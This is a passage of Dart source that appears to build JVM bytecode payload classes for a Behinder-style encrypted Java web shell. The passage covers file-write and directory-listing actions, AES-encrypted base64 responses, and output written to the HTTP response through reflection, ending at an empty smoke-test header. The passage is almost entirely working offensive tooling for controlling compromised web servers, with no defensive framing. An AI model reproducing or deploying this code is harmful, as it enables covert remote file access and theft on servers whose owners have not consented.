      cb.ldc(cp.string(path));
      cb.invokespecial(
          cp.methodref('java/io/File', '<init>', '(Ljava/lang/String;)V'));
      cb.invokespecial(cp.methodref('java/io/FileOutputStream', '<init>',
          '(Ljava/io/File;)V'));
      final fosSlot = 11;
      cb.astore(fosSlot);

      // fos.write(raw)
      cb.aload(fosSlot);
      cb.aload(dataSlot);
      cb.invokevirtual(cp.methodref('java/io/OutputStream', 'write',
          '([B)V'));

      // fos.flush()
      cb.aload(fosSlot);
      cb.invokevirtual(cp.methodref('java/io/OutputStream', 'flush', '()V'));

      // fos.close()
      cb.aload(fosSlot);
      cb.invokevirtual(cp.methodref('java/io/OutputStream', 'close', '()V'));

      // Return "1"
      cb.ldc(cp.string('1'));
      cb.astore(_kOutputSlot);
    });
  }

  // -----------------------------------------------------------------------
  // buildLs — list directory, return base64(name)|type|size|perms|modified
  // -----------------------------------------------------------------------
  GeneratedPayload buildLs(String path) {
    return _buildActionClass('Ls', (cb, cp) {
      // File dir = new File(path)
      cb.new_(cp.cls('java/io/File'));
      cb.dup();
      cb.ldc(cp.string(path));
      cb.invokespecial(
          cp.methodref('java/io/File', '<init>', '(Ljava/lang/String;)V'));
      final dirSlot = 10;
      cb.astore(dirSlot);

      // if (!dir.exists() || !dir.isDirectory()) return error
      cb.aload(dirSlot);
      cb.invokevirtual(cp.methodref('java/io/File', 'exists', '()Z'));
      cb.ifeq();
      final jBad = cb.mark() - 2;
      cb.aload(dirSlot);
      cb.invokevirtual(cp.methodref('java/io/File', 'isDirectory', '()Z'));
      cb.ifeq();
      final jBad2 = cb.mark() - 2;

      // File[] files = dir.listFiles()
      cb.aload(dirSlot);
      cb.invokevirtual(
          cp.methodref('java/io/File', 'listFiles', '()[Ljava/io/File;'));
      final filesSlot = 11;
      cb.astore(filesSlot);

      // if (files == null) → empty
      cb.aload(filesSlot);
      cb.ifnonnull();
      final jFilesOk = cb.mark() - 2;
      // null-files: fall through to error path below
      cb.goto_();
      final jFilesNull = cb.mark() - 2; // goto target → skips to errorLabel

      // --- files != null: iterate ---
      final nonNullStart = cb.mark();
      _patchPos(cb, jFilesOk, nonNullStart);
      cb.new_(cp.cls('java/lang/StringBuilder'));
      cb.dup();
      cb.invokespecial(
          cp.methodref('java/lang/StringBuilder', '<init>', '()V'));
      final sbSlot = 12;
      cb.astore(sbSlot);

      // SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm")
      cb.new_(cp.cls('java/text/SimpleDateFormat'));
      cb.dup();
      cb.ldc(cp.string('yyyy-MM-dd HH:mm'));
      cb.invokespecial(cp.methodref('java/text/SimpleDateFormat', '<init>',
          '(Ljava/lang/String;)V'));
      final sdfSlot = 13;
      cb.astore(sdfSlot);

      // Loop: for (int i = 0; i < files.length; i++)
      cb.iconst(0);
      final idxSlot = 14;
      cb.istore(idxSlot);

      final loopStart = cb.mark();
      cb.iload(idxSlot);
      cb.aload(filesSlot);
      cb.arraylength();
      cb.ifIcmpge();
      final jLoopEnd = cb.mark() - 2;

      // File f = files[i]
      cb.aload(filesSlot);
      cb.iload(idxSlot);
      cb.aaload();
      final fSlot = 15;
      cb.astore(fSlot);

      // --- Build one line: b64(name)|type|size|perms|modified ---

      // Append b64(f.getName())
      cb.aload(sbSlot);
      cb.aload(fSlot);
      cb.invokevirtual(
          cp.methodref('java/io/File', 'getName', '()Ljava/lang/String;'));
      cb.ldc(cp.string('UTF-8'));
      cb.invokevirtual(cp.methodref('java/lang/String', 'getBytes',
          '(Ljava/lang/String;)[B'));
      _emitB64EncodeBytes(cb, cp);
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();

      // Append "|"
      cb.aload(sbSlot);
      cb.ldc(cp.string('|'));
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();

      // Append type: f.isDirectory() ? "d" : "f"
      cb.aload(sbSlot);
      cb.aload(fSlot);
      cb.invokevirtual(
          cp.methodref('java/io/File', 'isDirectory', '()Z'));
      cb.ifeq();
      final jIsFile = cb.mark() - 2;
      cb.ldc(cp.string('d'));
      cb.goto_();
      final jTypeDone1 = cb.mark() - 2;
      final falseType = cb.mark();
      cb.ldc(cp.string('f'));
      final typeDone = cb.mark();
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();
      _patchPos(cb, jIsFile, falseType);
      _patchPos(cb, jTypeDone1, typeDone);

      // Append "|"
      cb.aload(sbSlot);
      cb.ldc(cp.string('|'));
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();

      // Append size: f.isFile() ? String.valueOf(f.length()) : "0"
      cb.aload(sbSlot);
      cb.aload(fSlot);
      cb.invokevirtual(cp.methodref('java/io/File', 'isFile', '()Z'));
      cb.ifeq();
      final jSizeZero = cb.mark() - 2;
      cb.aload(fSlot);
      cb.invokevirtual(
          cp.methodref('java/io/File', 'length', '()J'));
      cb.invokestatic(cp.methodref('java/lang/String', 'valueOf',
          '(J)Ljava/lang/String;'));
      cb.goto_();
      final jSizeDone1 = cb.mark() - 2;
      final falseSz = cb.mark();
      cb.ldc(cp.string('0'));
      final sizeDone = cb.mark();
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();
      _patchPos(cb, jSizeZero, falseSz);
      _patchPos(cb, jSizeDone1, sizeDone);

      // Append "|"
      cb.aload(sbSlot);
      cb.ldc(cp.string('|'));
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();

      // Append perms: (canRead?"r":"-")+(canWrite?"w":"-")+(canExecute?"x":"-")
      cb.aload(sbSlot);
      cb.aload(fSlot);
      cb.invokevirtual(cp.methodref('java/io/File', 'canRead', '()Z'));
      cb.ifeq();
      final jPermR = cb.mark() - 2;
      cb.ldc(cp.string('r'));
      cb.goto_();
      final jPermRdone = cb.mark() - 2;
      final falsePermR = cb.mark();
      cb.ldc(cp.string('-'));
      final permRdone = cb.mark();
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();
      _patchPos(cb, jPermR, falsePermR);
      _patchPos(cb, jPermRdone, permRdone);

      cb.aload(sbSlot);
      cb.aload(fSlot);
      cb.invokevirtual(cp.methodref('java/io/File', 'canWrite', '()Z'));
      cb.ifeq();
      final jPermW = cb.mark() - 2;
      cb.ldc(cp.string('w'));
      cb.goto_();
      final jPermWdone = cb.mark() - 2;
      final falsePermW = cb.mark();
      cb.ldc(cp.string('-'));
      final permWdone = cb.mark();
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();
      _patchPos(cb, jPermW, falsePermW);
      _patchPos(cb, jPermWdone, permWdone);

      cb.aload(sbSlot);
      cb.aload(fSlot);
      cb.invokevirtual(cp.methodref('java/io/File', 'canExecute', '()Z'));
      cb.ifeq();
      final jPermX = cb.mark() - 2;
      cb.ldc(cp.string('x'));
      cb.goto_();
      final jPermXdone = cb.mark() - 2;
      final falsePermX = cb.mark();
      cb.ldc(cp.string('-'));
      final permXdone = cb.mark();
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();
      _patchPos(cb, jPermX, falsePermX);
      _patchPos(cb, jPermXdone, permXdone);

      // Append "|"
      cb.aload(sbSlot);
      cb.ldc(cp.string('|'));
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();

      // Append modified: sdf.format(new Date(f.lastModified()))
      cb.aload(sbSlot);
      cb.aload(sdfSlot);
      cb.new_(cp.cls('java/util/Date'));
      cb.dup();
      cb.aload(fSlot);
      cb.invokevirtual(
          cp.methodref('java/io/File', 'lastModified', '()J'));
      cb.invokespecial(
          cp.methodref('java/util/Date', '<init>', '(J)V'));
      cb.invokevirtual(cp.methodref('java/text/DateFormat', 'format',
          '(Ljava/util/Date;)Ljava/lang/String;'));
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();

      // Append "\n"
      cb.aload(sbSlot);
      cb.ldc(cp.string('\n'));
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
          '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));
      cb.pop();

      // i++
      cb.iinc(idxSlot, 1);
      cb.goto_();
      final jLoop = cb.mark() - 2;
      final loopEnd = cb.mark();

      // End of non-null files path — sb.toString()
      cb.aload(sbSlot);
      cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'toString',
          '()Ljava/lang/String;'));
      cb.astore(_kOutputSlot);

      cb.goto_();
      final jDoneAll = cb.mark() - 2;

      // Error / null-files path
      final errorLabel = cb.mark();
      cb.ldc(cp.string('ERR_OPEN'));
      cb.astore(_kOutputSlot);

      _patchPos(cb, jBad, errorLabel);
      _patchPos(cb, jBad2, errorLabel);
      _patchPos(cb, jFilesNull, errorLabel);
      _patchPos(cb, jLoopEnd, loopEnd);
      _patchPos(cb, jLoop, loopStart);
      _patchPos(cb, jDoneAll, cb.mark());
    });
  }

  // -- helper: assemble complete .class file --------------------------------
  GeneratedPayload _assemble(ConstantPool cp, int thisCls, int objCls,
      List<Uint8List> methods, String rn) {
    final out = BytesBuilder(copy: false);

    final hdr = ByteData(8)
      ..setUint32(0, _kMagic)
      ..setUint16(4, _kMinorVersion)
      ..setUint16(6, _kMajorVersion);
    out.add(Uint8List.view(hdr.buffer));

    out.add(cp.toBytes());

    final af = ByteData(2)..setUint16(0, _kAccPublic | _kAccSuper);
    out.add(Uint8List.view(af.buffer));
    out.add(_u16b(thisCls));
    out.add(_u16b(objCls));
    out.add(Uint8List(2)); // interfaces_count
    out.add(Uint8List(2)); // fields_count

    // methods_count
    final mc = ByteData(2)..setUint16(0, methods.length);
    out.add(Uint8List.view(mc.buffer));
    for (final m in methods) {
      out.add(m);
    }

    out.add(Uint8List(2)); // class attributes_count
    return GeneratedPayload(classBytes: out.toBytes(), className: rn);
  }
}

// ---------------------------------------------------------------------------
// Bytecode helper emitters (top-level functions)
// ---------------------------------------------------------------------------

/// Write: obj.getClass().getMethod(name, [argType]).invoke(obj, [argStr])
void _emitInvokeVoid1(_CodeBuf cb, ConstantPool cp,
    {required int objRefSlot, required String methodName, required int argSlot,
    required int argStrCp, required String argType}) {
  cb.aload(objRefSlot);
  cb.invokevirtual(
      cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
  cb.ldc(cp.string(methodName));
  cb.iconst(1);
  cb.anewarray(cp.cls('java/lang/Class'));
  cb.dup();
  cb.iconst(0);
  cb.ldc(cp.cls(argType));
  cb.aastore();
  cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
      '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
  cb.aload(objRefSlot);
  cb.iconst(1);
  cb.anewarray(cp.cls('java/lang/Object'));
  cb.dup();
  cb.iconst(0);
  cb.ldc(argStrCp);
  cb.aastore();
  cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
      '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
  cb.pop();
}

/// Emit: new String[]{s1, s2, s3}
void _emitStringArray3(
    _CodeBuf cb, ConstantPool cp, int strClsIdx, int s0, int s1, int s2) {
  cb.iconst(3);
  cb.anewarray(strClsIdx);
  cb.dup();
  cb.iconst(0);
  cb.ldc(s0);
  cb.aastore();
  cb.dup();
  cb.iconst(1);
  cb.ldc(s1);
  cb.aastore();
  cb.dup();
  cb.iconst(2);
  cb.ldc(s2);
  cb.aastore();
}

/// Read all bytes from process.{methodName}() into bosSlot.
void _emitReadStream(_CodeBuf cb, ConstantPool cp,
    {required int processSlot, required int bosSlot,
    required String methodName}) {
  // bos = new ByteArrayOutputStream()
  cb.new_(cp.cls('java/io/ByteArrayOutputStream'));
  cb.dup();
  cb.invokespecial(cp.methodref(
      'java/io/ByteArrayOutputStream', '<init>', '()V'));
  cb.astore(bosSlot);

  // in = process.getInputStream() (or getErrorStream)
  cb.aload(processSlot);
  cb.invokevirtual(
      cp.methodref('java/lang/Process', methodName, '()Ljava/io/InputStream;'));
  final inSlot = bosSlot + 1;
  cb.astore(inSlot);

  // buf = new byte[4096]
  final bufSlot = inSlot + 1;
  cb.iconst(4096);
  cb.newarray(_kTByte);
  cb.astore(bufSlot);

  // Loop: while ((len = in.read(buf)) != -1) bos.write(buf, 0, len)
  final loopStart = cb.mark();
  cb.aload(inSlot);
  cb.aload(bufSlot);
  cb.invokevirtual(
      cp.methodref('java/io/InputStream', 'read', '([B)I'));
  final lenSlot = bufSlot + 1;
  cb.istore(lenSlot);

  cb.iload(lenSlot);
  cb.iflt();
  final jEnd = cb.mark() - 2;

  cb.aload(bosSlot);
  cb.aload(bufSlot);
  cb.iconst(0);
  cb.iload(lenSlot);
  cb.invokevirtual(cp.methodref(
      'java/io/ByteArrayOutputStream', 'write', '([BII)V'));
  cb.goto_();
  final jLoop = cb.mark() - 2;
  final loopEnd = cb.mark();

  // close input (close() returns void, no pop)
  cb.aload(inSlot);
  cb.invokevirtual(
      cp.methodref('java/io/InputStream', 'close', '()V'));

  _patchPos(cb, jEnd, loopEnd);
  _patchPos(cb, jLoop, loopStart);
}

/// Build Behinder JSON: {"status":"<b64>","msg":"<b64>"} using StringBuilder.
void _emitBuildJson(_CodeBuf cb, ConstantPool cp,
    {required int outputSlot, required int jsonSlot}) {
  cb.new_(cp.cls('java/lang/StringBuilder'));
  cb.dup();
  cb.invokespecial(
      cp.methodref('java/lang/StringBuilder', '<init>', '()V'));

  // append("{\"status\":\"")
  cb.ldc(cp.string('{"status":"'));
  cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
      '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));

  // append(base64("success"))
  cb.ldc(cp.string('success'));
  cb.ldc(cp.string('UTF-8'));
  cb.invokevirtual(
      cp.methodref('java/lang/String', 'getBytes', '(Ljava/lang/String;)[B'));
  _emitB64EncodeBytes(cb, cp);
  cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
      '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));

  // append("\",\"msg\":\"")
  cb.ldc(cp.string('","msg":"'));
  cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
      '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));

  // append(base64(output))
  cb.aload(outputSlot);
  cb.ldc(cp.string('UTF-8'));
  cb.invokevirtual(
      cp.methodref('java/lang/String', 'getBytes', '(Ljava/lang/String;)[B'));
  _emitB64EncodeBytes(cb, cp);
  cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
      '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));

  // append("\"}")
  cb.ldc(cp.string('"}'));
  cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'append',
      '(Ljava/lang/String;)Ljava/lang/StringBuilder;'));

  cb.invokevirtual(cp.methodref('java/lang/StringBuilder', 'toString',
      '()Ljava/lang/String;'));
  cb.astore(jsonSlot);
}

/// Emit base64 encoding via java.util.Base64.getEncoder().encodeToString().
/// Stack: byte[] → String
void _emitB64EncodeBytes(_CodeBuf cb, ConstantPool cp) {
  cb.invokestatic(cp.methodref('java/util/Base64', 'getEncoder',
      '()Ljava/util/Base64\$Encoder;'));
  cb.swap();
  cb.invokevirtual(cp.methodref('java/util/Base64\$Encoder', 'encodeToString',
      '([B)Ljava/lang/String;'));
}

/// Emit AES-128-ECB encrypt + base64 → byte[].
/// Plaintext bytes at [plainSlot]; result bytes at [resultSlot].
void _emitAesEncryptB64Raw(_CodeBuf cb, ConstantPool cp, String key,
    {required int plainSlot, required int resultSlot}) {
  final aesStrCp = cp.string('AES');
  final keyStrCp = cp.string(key);
  final utf8StrCp = cp.string('UTF-8');

  // Cipher cipher = Cipher.getInstance("AES")
  cb.ldc(aesStrCp);
  cb.invokestatic(cp.methodref('javax/crypto/Cipher', 'getInstance',
      '(Ljava/lang/String;)Ljavax/crypto/Cipher;'));
  final cipherSlot = resultSlot + 20; // far from other slots
  cb.astore(cipherSlot);

  // new SecretKeySpec(key.getBytes("UTF-8"), "AES")
  cb.new_(cp.cls('javax/crypto/spec/SecretKeySpec'));
  cb.dup();
  cb.ldc(keyStrCp);
  cb.ldc(utf8StrCp);
  cb.invokevirtual(
      cp.methodref('java/lang/String', 'getBytes', '(Ljava/lang/String;)[B'));
  cb.ldc(aesStrCp);
  cb.invokespecial(cp.methodref('javax/crypto/spec/SecretKeySpec', '<init>',
      '([BLjava/lang/String;)V'));
  final keySlot = cipherSlot + 1;
  cb.astore(keySlot);

  // cipher.init(1, keySpec) — 1 = ENCRYPT_MODE
  cb.aload(cipherSlot);
  cb.iconst(1);
  cb.aload(keySlot);
  cb.invokevirtual(cp.methodref('javax/crypto/Cipher', 'init',
      '(ILjava/security/Key;)V'));

  // encrypted = cipher.doFinal(plainBytes)
  cb.aload(cipherSlot);
  cb.aload(plainSlot);
  cb.invokevirtual(
      cp.methodref('javax/crypto/Cipher', 'doFinal', '([B)[B'));
  final encSlot = keySlot + 1;
  cb.astore(encSlot);

  // base64 encode the encrypted bytes
  cb.aload(encSlot);
  _emitB64EncodeBytes(cb, cp);

  // Convert to UTF-8 bytes
  cb.ldc(utf8StrCp);
  cb.invokevirtual(
      cp.methodref('java/lang/String', 'getBytes', '(Ljava/lang/String;)[B'));
  cb.astore(resultSlot);
}

/// Write byte[] data to response via reflection.
void _emitWriteResponse(_CodeBuf cb, ConstantPool cp,
    {required int responseSlot, required int dataSlot}) {
  // tmp = response.getClass().getMethod("getOutputStream").invoke(response)
  _emitReflectiveCall(cb, cp, objSlot: responseSlot, methodName: 'getOutputStream',
      argCount: 0);
  final osSlot = dataSlot + 10; // temp
  cb.astore(osSlot);

  // write(data) via reflection
  cb.aload(osSlot);
  cb.invokevirtual(
      cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
  cb.ldc(cp.string('write'));
  cb.iconst(1);
  cb.anewarray(cp.cls('java/lang/Class'));
  cb.dup();
  cb.iconst(0);
  cb.ldc(cp.cls('[B'));
  cb.aastore();
  cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
      '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
  cb.aload(osSlot);
  cb.iconst(1);
  cb.anewarray(cp.cls('java/lang/Object'));
  cb.dup();
  cb.iconst(0);
  cb.aload(dataSlot);
  cb.aastore();
  cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
      '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
  cb.pop();

  // flush() via reflection
  cb.aload(osSlot);
  cb.invokevirtual(
      cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
  cb.ldc(cp.string('flush'));
  cb.iconst(0);
  cb.anewarray(cp.cls('java/lang/Class'));
  cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
      '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
  cb.aload(osSlot);
  cb.iconst(0);
  cb.anewarray(cp.cls('java/lang/Object'));
  cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
      '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
  cb.pop();
}

/// obj.getClass().getMethod(name).invoke(obj) — result on stack.
void _emitReflectiveCall(_CodeBuf cb, ConstantPool cp,
    {required int objSlot, required String methodName, required int argCount}) {
  cb.aload(objSlot);
  cb.invokevirtual(
      cp.methodref('java/lang/Object', 'getClass', '()Ljava/lang/Class;'));
  cb.ldc(cp.string(methodName));
  cb.iconst(argCount);
  cb.anewarray(cp.cls('java/lang/Class'));
  cb.invokevirtual(cp.methodref('java/lang/Class', 'getMethod',
      '(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;'));
  cb.aload(objSlot);
  cb.iconst(argCount);
  cb.anewarray(cp.cls('java/lang/Object'));
  cb.invokevirtual(cp.methodref('java/lang/reflect/Method', 'invoke',
      '(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;'));
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

Uint8List _u16b(int v) {
  final d = ByteData(2)..setUint16(0, v);
  return Uint8List.view(d.buffer);
}

void _patchPos(_CodeBuf cb, int pos, int target) {
  // pos is the byte offset of the 2-byte branch-offset slot (0-indexed within _buf).
  // The branch instruction's opcode is at (pos - 1); JVM branch offsets are
  // relative to the START of the branch instruction.
  final offset = target - (pos - 1);
  cb._buf[pos] = (offset >> 8) & 0xFF;
  cb._buf[pos + 1] = offset & 0xFF;
  // Remove from pending list so patchHere() won't overwrite.
  cb._patchPoints.remove(pos);
}

String _b64(String s) {
  // Dart-computed base64 — this is the value that gets embedded in the
  // class constant pool, so the JVM side doesn't need to compute it.
  final bytes = _utf8Bytes(s);
  const alphabet =
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  final out = StringBuffer();
  for (var i = 0; i < bytes.length; i += 3) {
    final a = bytes[i];
    final b = i + 1 < bytes.length ? bytes[i + 1] : 0;
    final c = i + 2 < bytes.length ? bytes[i + 2] : 0;
    out.write(alphabet[a >> 2]);
    out.write(alphabet[((a & 0x3) << 4) | (b >> 4)]);
    out.write(i + 1 < bytes.length ? alphabet[((b & 0xF) << 2) | (c >> 6)] : '=');
    out.write(i + 2 < bytes.length ? alphabet[c & 0x3F] : '=');
  }
  return out.toString();
}

Uint8List _utf8Bytes(String s) {
  final l = <int>[];
  for (var i = 0; i < s.length; i++) {
    final c = s.codeUnitAt(i);
    if (c <= 0x7F) {
      l.add(c);
    } else if (c <= 0x7FF) {
      l.add(0xC0 | (c >> 6));
      l.add(0x80 | (c & 0x3F));
    } else {
      l.add(0xE0 | (c >> 12));
      l.add(0x80 | ((c >> 6) & 0x3F));
      l.add(0x80 | (c & 0x3F));
    }
  }
  return Uint8List.fromList(l);
}

// ---------------------------------------------------------------------------
// Smoke test (standalone — run with `dart run test/jvm_bytecode_test.dart`)
// ---------------------------------------------------------------------------
